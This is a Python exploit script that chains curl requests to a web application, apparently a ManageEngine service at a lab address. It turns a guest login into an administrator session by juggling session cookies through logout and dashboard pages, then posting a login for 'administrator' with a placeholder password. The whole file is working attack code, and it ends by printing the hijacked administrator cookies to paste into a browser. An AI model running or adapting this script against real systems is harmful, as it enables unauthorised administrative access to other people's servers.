import os
import re
#Host ip address + port
host="10.10.10.132:8080"
#set to https if needed
url = "http://" + host
#Username with credentials you have
low_username="guest"
low_password="guest"
#username you want to login as
high_username="administrator"
print("\033[1;37mUrl: \033[1;32m" + url)
print("\033[1;37mUser with low priv: \033[1;32m" + low_username + ':' + low_password)
print("\033[1;37mUser to bypass authentication to: \033[1;32m" + high_username)
print("\033[1;32mGetting a session id\033[1;37m")
# Get index page to capture a session id
curl = "curl -i -s -k  -X $'GET' \
    -H $'Host: "+host+"'  -H $'Referer: "+url+"/' -H $'Connection: close'\
    $'"+url+"/'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
sessid = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
print("Sessid:")
print(sessid)
print("\033[1;31mLogging in with low privilege user\033[1;37m")
#Attempt login post request 
curl="curl -i -s -k -X $'POST' -H $'Host: "+host+"'\
 -H $'Referer: "+url+"/'\
 -H $'Connection: close' -H $'Cookie: JSESSIONID="+sessid+"' \
 -b $'JSESSIONID="+sessid+"' \
 --data-binary $'j_username="+low_username+"&j_password="+low_password+"&LDAPEnable=false&\
 hidden=Select+a+Domain&hidden=For+Domain&AdEnable=false&DomainCount=0&LocalAuth=No&LocalAuthWithDomain=No&\
 dynamicUserAddition_status=true&localAuthEnable=true&logonDomainName=-1&loginButton=Login&checkbox=checkbox' \
 $'"+url+"/j_security_check'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
#Instead of following redirects with -L, following manually because we don't need all the transactions.
curl="curl -i -s -k -X $'GET' -H $'Host: "+host+"'\
 -H $'Referer: "+url+"/'\
 -H $'Connection: close' -H $'Cookie: JSESSIONID="+sessid+"' \
 -b $'JSESSIONID="+sessid+"' \
 $'"+url+"/'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
print("\033[1;32mCaptured authenticated cookies.\033[1;37m")
sessid = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
print(sessid)
sessidsso = re.findall("(?<=Set-Cookie: JSESSIONIDSSO=)[^;]*",out)[0]
print(sessidsso)
grbl = re.findall("(?<=Set-Cookie: )[^=]*=[^;]*",out)
grbl2 = []
for cookie in grbl:
	cl = cookie.split('=')
	if cl[0]!='JSESSIONID' and cl[0]!='JSESSIONIDSSO' and cl[0]!='_rem':
		grbl2.append(cl[0])
		grbl2.append(cl[1])
curl = "curl -i -s -k -X $'GET' \
    -H $'Host: "+host+"' \
    -H $'Cookie: JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    -b $'JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    $'"+url+"/mc/'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
sessid2 = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
print("\033[1;32mCaptured secondary sessid.\033[1;37m")
print(sessid2)
print("\033[1;31mDoing the magic step 1.\033[1;37m")
curl = "curl -i -s -k -X $'GET' \
    -H $'Host: "+host+"' \
	-H $'Referer: "+url+"/mc/WOListView.do' \
	-H $'Cookie: JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
	-b $'JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
	$'"+url+"/mc/jsp/MCLogOut.jsp'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
print("\033[1;31mDoing the magic step 2.\033[1;37m")
curl = "curl -i -s -k -X $'GET' \
    -H $'Host: "+host+"' \
    -H $'Cookie: JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    -b $'JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    $'"+url+"/mc/jsp/MCDashboard.jsp'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
sessid3 = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
sessidsso = re.findall("(?<=Set-Cookie: JSESSIONIDSSO=)[^;]*",out)[0]
curl = "curl -i -s -k -X $'GET' \
    -H $'Host: "+host+"' \
    -H $'Cookie: JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    -b $'JSESSIONID="+sessid2+"; JSESSIONID="+sessid+"; JSESSIONIDSSO="+sessidsso+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    $'"+url+"/'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
sessid4 = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
curl = "curl -i -s -k -X $'POST' \
    -H $'"+host+"' \
    -H $'Referer: "+url+"/mc/jsp/MCDashboard.jsp' \
    -H $'Cookie: JSESSIONID="+sessid3+"; JSESSIONID="+sessid4+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    -b $'JSESSIONID="+sessid3+"; JSESSIONID="+sessid4+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    --data-binary $'j_username="+high_username+"&j_password=bypassingpass&DOMAIN_NAME=' \
    $'"+url+"/mc/j_security_check'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
curl = "curl -i -s -k -X $'GET' \
    -H $'Host: "+host+"' \
    -H $'Referer: "+url+"/mc/jsp/MCDashboard.jsp' \
    -H $'Cookie: JSESSIONID="+sessid3+"; JSESSIONID="+sessid4+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    -H $'Upgrade-Insecure-Requests: 1' \
    -b $'JSESSIONID="+sessid3+"; JSESSIONID="+sessid4+"; _rem=true;"+grbl2[0]+"="+grbl2[1]+"; "+grbl2[2]+"="+grbl2[3]+"' \
    $'"+url+"/mc/jsp/MCDashboard.jsp'"
out = os.popen('/bin/bash -c "' + curl+'"').read()
sessidhigh = re.findall("(?<=Set-Cookie: JSESSIONID=)[^;]*",out)[0]
sessidssohigh = re.findall("(?<=Set-Cookie: JSESSIONIDSSO=)[^;]*",out)[0]

print("\033[1;31mCaptured target session.Set following cookies on your browser.\033[1;37m")
print("JSESSIONID=" + sessidhigh)
print("JSESSIONIDSSO=" + sessidssohigh)
print(grbl2[0] + "=" + grbl2[1])
print(grbl2[2] + "=" + grbl2[3])
print("_rem=true")